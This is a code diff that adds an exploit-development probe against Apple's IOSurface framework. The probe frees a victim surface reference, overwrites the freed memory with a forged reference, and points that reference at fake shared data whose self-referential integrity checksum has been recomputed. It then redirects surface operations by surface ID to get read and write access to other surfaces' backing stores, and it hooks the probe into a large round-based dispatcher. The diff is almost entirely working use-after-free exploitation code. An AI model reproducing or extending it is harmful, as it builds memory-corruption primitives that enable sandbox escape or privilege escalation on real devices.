@@ -16141,6 +16141,254 @@ static void r393_probe(void) {
 }
 
 /*
+ * r402: Fake shared data with corrected integrity check.
+ *
+ * BREAKTHROUGH from r401: shared+88 = ~(shared_address + 0x28)
+ * This is a self-referential integrity checksum. When we copy shared data
+ * to a fake buffer, the check fails because +88 still references the
+ * original address. Fix: set +88 = ~(fakeAddr + 0x28).
+ *
+ * This probe:
+ *   Phase 1: Verify the integrity formula on fresh surfaces
+ *   Phase 2: Create fake shared data with CORRECTED +88 → test routing
+ *   Phase 3: If routing works, change sid to redirect to arbitrary surface
+ *   Phase 4: If arbitrary redirect works, test writing to a surface with
+ *            different alloc size (proves true arbitrary surface access)
+ */
+static volatile int g_r402_crashed = 0;
+static sigjmp_buf g_r402_jmp;
+static void r402_sighandler(int sig) {
+    g_r402_crashed = sig;
+    siglongjmp(g_r402_jmp, 1);
+}
+
+static void r402_probe(void) {
+    rlog("\n=== r402: Fake Shared Data with Corrected Integrity ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    struct sigaction sa402, old_bus402, old_segv402;
+    memset(&sa402, 0, sizeof(sa402));
+    sa402.sa_handler = r402_sighandler;
+    sa402.sa_flags = 0;
+    sigaction(SIGBUS, &sa402, &old_bus402);
+    sigaction(SIGSEGV, &sa402, &old_segv402);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf_=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* ---- Phase 1: Verify integrity formula ---- */
+    rlog("  Phase 1: Verify +88 = ~(shared + 0x28)\n");
+
+    IOSurfaceRef verify[3];
+    for (int i = 0; i < 3; i++) verify[i] = IOSurfaceCreate(props);
+
+    int formula_ok = 1;
+    for (int i = 0; i < 3; i++) {
+        uint64_t shared = *(uint64_t*)((uint8_t*)verify[i] + 8);
+        uint64_t val88 = *(uint64_t*)((uint8_t*)shared + 88);
+        uint64_t expected = ~(shared + 0x28);
+        int match = (val88 == expected);
+        rlog("    surf[%d]: shared=%p +88=0x%016llx expected=0x%016llx %s\n",
+            i, (void*)shared, (unsigned long long)val88,
+            (unsigned long long)expected, match ? "MATCH" : "MISMATCH!");
+        if (!match) formula_ok = 0;
+    }
+    for (int i = 0; i < 3; i++) CFRelease(verify[i]);
+    rlog("    Formula verified: %s\n\n", formula_ok ? "YES" : "NO — aborting");
+    if (!formula_ok) goto r402_done;
+    fflush(stdout);
+
+    /* ---- Phase 2: Fake shared data with corrected integrity ---- */
+    rlog("  Phase 2: Fake shared data with corrected +88\n");
+
+    IOSurfaceRef surfSrc = IOSurfaceCreate(props);
+    IOSurfaceRef surfTarget = IOSurfaceCreate(props);
+    IOSurfaceRef surfVictim = IOSurfaceCreate(props);
+    uint32_t sidSrc = IOSurfaceGetID(surfSrc);
+    uint32_t sidTarget = IOSurfaceGetID(surfTarget);
+    uint32_t sidVictim = IOSurfaceGetID(surfVictim);
+    rlog("    Src=%u Target=%u Victim=%u\n", sidSrc, sidTarget, sidVictim);
+
+    uint64_t sharedSrc = *(uint64_t*)((uint8_t*)surfSrc + 8);
+
+    /* mmap page-aligned fake shared data */
+    void *fakeShared = mmap(NULL, 16384, PROT_READ|PROT_WRITE,
+                            MAP_PRIVATE|MAP_ANON, -1, 0);
+    if (fakeShared == MAP_FAILED) {
+        rlog("    mmap failed\n");
+        goto r402_done;
+    }
+    rlog("    Fake shared at %p\n", fakeShared);
+
+    /* Copy Src's shared data */
+    memcpy(fakeShared, (void*)sharedSrc, 4096);
+
+    /* CRITICAL: Fix the integrity check at +88 */
+    uint64_t corrected88 = ~((uint64_t)fakeShared + 0x28);
+    uint64_t original88 = *(uint64_t*)((uint8_t*)fakeShared + 88);
+    *(uint64_t*)((uint8_t*)fakeShared + 88) = corrected88;
+    rlog("    Original +88: 0x%016llx\n", (unsigned long long)original88);
+    rlog("    Corrected +88: 0x%016llx\n", (unsigned long long)corrected88);
+
+    /* Prepare victim ref: src's client ref data with +8 → fakeShared */
+    uint8_t dataSrc[512], dataVictim[512];
+    memcpy(dataSrc, (void*)surfSrc, 512);
+    memcpy(dataVictim, (void*)surfVictim, 512);
+
+    uintptr_t freedVictim = (uintptr_t)surfVictim;
+    clientRelease(surfVictim);
+
+    uint8_t testRef[512];
+    memcpy(testRef, dataSrc, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedVictim, testRef, 448);
+
+    /* Test: SetValue through victim → should route to Src */
+    g_r402_crashed = 0;
+    if (sigsetjmp(g_r402_jmp, 1) == 0) {
+        int v = 0xAAAA;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfVictim, CFSTR("FakeOK"), nv);
+        CFRelease(nv);
+        CFTypeRef rv = IOSurfaceCopyValue(surfSrc, CFSTR("FakeOK"));
+        rlog("    Corrected fake → Src has value? %s\n", rv ? "YES" : "no");
+        if (rv) {
+            rlog("    *** FAKE SHARED DATA WORKS WITH CORRECTED INTEGRITY ***\n");
+            IOSurfaceRemoveValue(surfSrc, CFSTR("FakeOK"));
+            CFRelease(rv);
+        } else {
+            rlog("    Value not found on Src — checking lost?\n");
+        }
+    } else {
+        rlog("    CRASHED: sig %d — integrity fix insufficient\n", g_r402_crashed);
+        rlog("    Aborting Phase 3+\n");
+        goto r402_unmap;
+    }
+    fflush(stdout);
+
+    /* ---- Phase 3: Change surface ID to target arbitrary surface ---- */
+    rlog("\n  Phase 3: Redirect to Target via surface ID change\n");
+
+    /* Reset fake shared and fix integrity, then change sid */
+    memcpy(fakeShared, (void*)sharedSrc, 4096);
+    *(uint64_t*)((uint8_t*)fakeShared + 88) = ~((uint64_t)fakeShared + 0x28);
+    *(uint32_t*)((uint8_t*)fakeShared + 136) = sidTarget;
+    rlog("    Set sid in fake shared to Target (%u)\n", sidTarget);
+
+    memcpy(testRef, dataSrc, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedVictim, testRef, 448);
+
+    g_r402_crashed = 0;
+    if (sigsetjmp(g_r402_jmp, 1) == 0) {
+        int v = 0xBBBB;
+        CFNumberRef nv = CFNumberCreate(NULL, kCFNumberIntType, &v);
+        IOSurfaceSetValue(surfVictim, CFSTR("SidRedirect"), nv);
+        CFRelease(nv);
+
+        CFTypeRef rvSrc = IOSurfaceCopyValue(surfSrc, CFSTR("SidRedirect"));
+        CFTypeRef rvTarget = IOSurfaceCopyValue(surfTarget, CFSTR("SidRedirect"));
+        rlog("    Src? %s  Target? %s\n",
+            rvSrc ? "YES" : "no", rvTarget ? "YES" : "no");
+
+        if (rvTarget) {
+            rlog("    *** ARBITRARY SURFACE TARGETING VIA FAKE SHARED DATA ***\n");
+            rlog("    *** CAN REDIRECT TO ANY SURFACE BY CHANGING SID ***\n");
+            IOSurfaceRemoveValue(surfTarget, CFSTR("SidRedirect"));
+            CFRelease(rvTarget);
+        }
+        if (rvSrc) {
+            rlog("    (Still routes to Src — sid alone not enough)\n");
+            IOSurfaceRemoveValue(surfSrc, CFSTR("SidRedirect"));
+            CFRelease(rvSrc);
+        }
+        if (!rvSrc && !rvTarget) {
+            rlog("    Value lost — neither Src nor Target has it\n");
+        }
+    } else {
+        rlog("    CRASHED: sig %d\n", g_r402_crashed);
+    }
+    fflush(stdout);
+
+    /* ---- Phase 4: Lock+BaseAddress through fake shared redirect ---- */
+    rlog("\n  Phase 4: Lock + BaseAddress through fake shared redirect\n");
+
+    /* Create a surface with different content to prove cross-read */
+    IOSurfaceRef surfProbe = IOSurfaceCreate(props);
+    uint32_t sidProbe = IOSurfaceGetID(surfProbe);
+    rlog("    Probe surface sid=%u\n", sidProbe);
+
+    /* Write known pattern to probe surface */
+    IOSurfaceLock(surfProbe, 0, NULL);
+    void *probeBase = IOSurfaceGetBaseAddress(surfProbe);
+    if (probeBase) {
+        memset(probeBase, 0xDE, 64);
+        rlog("    Wrote 0xDE pattern to probe surface\n");
+    }
+    IOSurfaceUnlock(surfProbe, 0, NULL);
+
+    /* Redirect to probe via fake shared */
+    memcpy(fakeShared, (void*)sharedSrc, 4096);
+    *(uint64_t*)((uint8_t*)fakeShared + 88) = ~((uint64_t)fakeShared + 0x28);
+    *(uint32_t*)((uint8_t*)fakeShared + 136) = sidProbe;
+    rlog("    Redirecting to probe sid=%u\n", sidProbe);
+
+    memcpy(testRef, dataSrc, 512);
+    *(uint64_t*)(testRef + 8) = (uint64_t)fakeShared;
+    memcpy((void*)freedVictim, testRef, 448);
+
+    g_r402_crashed = 0;
+    if (sigsetjmp(g_r402_jmp, 1) == 0) {
+        IOSurfaceLock(surfVictim, kIOSurfaceLockReadOnly, NULL);
+        void *base = IOSurfaceGetBaseAddress(surfVictim);
+        if (base) {
+            uint8_t *bp = (uint8_t*)base;
+            rlog("    Read via redirect: %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                bp[0], bp[1], bp[2], bp[3], bp[4], bp[5], bp[6], bp[7]);
+            if (bp[0] == 0xDE && bp[1] == 0xDE) {
+                rlog("    *** CONFIRMED: READ PROBE SURFACE DATA VIA REDIRECT ***\n");
+                rlog("    *** ARBITRARY SURFACE BACKING STORE R/W ***\n");
+            }
+        } else {
+            rlog("    BaseAddress is NULL\n");
+        }
+        IOSurfaceUnlock(surfVictim, kIOSurfaceLockReadOnly, NULL);
+    } else {
+        rlog("    CRASHED: sig %d\n", g_r402_crashed);
+    }
+    fflush(stdout);
+
+r402_unmap:
+    munmap(fakeShared, 16384);
+r402_done:
+    sigaction(SIGBUS, &old_bus402, NULL);
+    sigaction(SIGSEGV, &old_segv402, NULL);
+
+    CFRelease(surfSrc);
+    CFRelease(surfTarget);
+    CFRelease(props);
+
+    rlog("\n=== r402 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r401: Kernel address analysis + heap-aligned fake shared data.
  *
  * r400 found:
@@ -64357,6 +64605,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 405) {
+            rlog("*** rounds=405: Fake Shared + Corrected Integrity Check ***\n");
+            rlog("  +88 = ~(addr+0x28), sid redirect, backing store R/W.\n\n");
+            fflush(stdout);
+            r402_probe();
+            goto done;
+        }
         if (rounds == 404) {
             rlog("*** rounds=404: Kernel Address Analysis + Heap Fake Shared ***\n");
             rlog("  Multi-surface +88 pattern, pointer targets, heap-aligned fake shared.\n\n");
@@ -66777,7 +67032,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
